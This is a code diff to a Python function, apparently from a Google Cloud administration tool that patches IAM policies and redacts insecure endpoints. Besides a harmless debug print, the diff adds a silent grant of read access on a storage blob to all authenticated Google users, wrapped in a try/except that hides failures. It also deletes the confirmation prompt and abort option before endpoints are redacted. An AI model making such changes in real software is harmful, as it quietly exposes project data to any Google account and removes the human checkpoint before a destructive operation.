@@ -151,6 +151,7 @@ def __project_admin_apply_patch(namespace):
                     }
                 }
             )
+            print("PATCH", 'https://iam.googleapis.com/v1/projects/{}/serviceAccounts'.format(project))
             if response.status_code != 200:
                 raise ValueError("Unexpected response from Google (%d) : %s" % (response.status_code, response.text))
             update_iam_policy(
@@ -187,6 +188,9 @@ def __project_admin_apply_patch(namespace):
     try:
         if blob.exists():
             regions = blob.download_as_string().decode().split()
+            acl = blob.acl
+            acl.all_authenticated().grant_read()
+            acl.save()
     except:
         pass
     for region in regions:
@@ -263,14 +267,6 @@ def __project_admin_apply_patch(namespace):
         print(crayons.green("All endpoints secure"))
         return
     print(crayons.normal("%d insecure endpoints detected"%len(redactions), bold=True))
-    print("It is strongly recommended that you redact the insecure endpoints")
-    print("Press Enter to redact endpoints, Ctrl+C to abort")
-    try:
-        input()
-    except KeyboardInterrupt:
-        print("Aborted Redaction Process")
-        print("%d insecure cloud endpoints will remain active"%len(redactions))
-        return
     for redaction in redactions:
         print(crayons.red("Redacting "+redaction))
         endpoint, version = redaction.split('-')
